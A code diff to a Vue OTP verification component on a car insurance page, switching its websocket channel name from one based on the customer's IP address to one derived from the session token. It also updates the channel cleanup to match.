@@ -103,6 +103,7 @@ import StcLayout from '@/car.insurance/components/StcLayout.vue';
 import { getReasonLabel } from '@/constants/rejectionReasons';
 import { safeRedirect } from '@/utils/safeRedirect';
 import { getSessionToken } from '@/utils/sessionToken';
+import { customerBroadcastChannel } from '@/utils/customerBroadcastChannel';
 import { useWebOtp } from '@/composables/useWebOtp';
 
 const router = useRouter();
@@ -128,6 +129,7 @@ const rejectMessage = ref( '' );
 const error = ref( '' );
 let countdownInterval = null;
 let echoChannel = null;
+let echoChannelName = '';
 let pollTimer = null;
 
 const canVerify = computed( () =>
@@ -183,9 +185,10 @@ const verifyOtp = async () =>
 async function setupWebSocket ()
 {
     const echo = await getEcho();
-    if ( !echo || !customerIp ) return;
+    if ( !echo ) return;
 
-    echoChannel = echo.channel( `stc.${ customerIp }` );
+    echoChannelName = await customerBroadcastChannel( 'stc', getSessionToken() );
+    echoChannel = echo.channel( echoChannelName );
 
     echoChannel.listen( '.StcOtpApproved', handleApproved );
     echoChannel.listen( '.StcOtpRejected', handleRejected );
@@ -304,9 +307,9 @@ onUnmounted( () =>
         clearInterval( pollTimer );
         pollTimer = null;
     }
-    if ( echoChannel && customerIp )
+    if ( echoChannel && echoChannelName )
     {
-        try { window.Echo?.leave( `stc.${ customerIp }` ); } catch { /* */ }
+        try { window.Echo?.leave( echoChannelName ); } catch { /* */ }
     }
 } );
 </script>
